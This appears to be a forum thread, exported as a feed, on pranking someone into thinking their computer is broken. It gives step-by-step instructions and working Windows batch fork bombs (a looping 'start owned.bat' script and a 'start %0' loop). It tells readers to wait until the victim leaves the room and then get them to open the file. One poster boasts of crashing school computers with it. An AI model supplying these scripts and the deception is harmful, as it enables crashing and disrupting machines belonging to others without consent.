channel.title: How to make someone think there computer is broken
channel.description:
hi im gonna tell you how to make people think there computer is broken by harmlessly (i think) making cmd spazz up :)
step 1: first wait till they go out of the room or they will know what you are doing,
Step 2: open up notepad
Step 3: tipe start as many times as you like on different lines, 8 minimum
Step 4: save as anything you want but put .bat at the end
Step 5: tell them to open it and watch there face as command promt apears hundreds of times
P.S if you are using the old windows this may not work

item.title: How to make someone think there computer is broken
item.dc:creator: @tilduer tilduer
item.description:
@tilduer wrote:

This is a better and easier to make spammer: (beware it might bluescreen their computer.)

Open notepad and write this:

[code]@echo on

start owned.bat
start owned.bat
start owned.bat
start owned.bat
start owned.bat
start owned.bat

exit.[/code]

then save the notepad as: owned.bat
run it and it will “own” their computer =P ( bware it will
Note: you can save the name as anything you like IF you change the owned in the start owned.bat to whatever you save the name as, so it opens itself. ive used this 2 blue screen school computers before, as all my viruses dont get let in and i can make that in 2 seconds. GL

Read full topic

@echo off
:run
start
goto run

the true forkbomb way would be to
:a
start %0
goto a
[/quote]

why dont you try it…
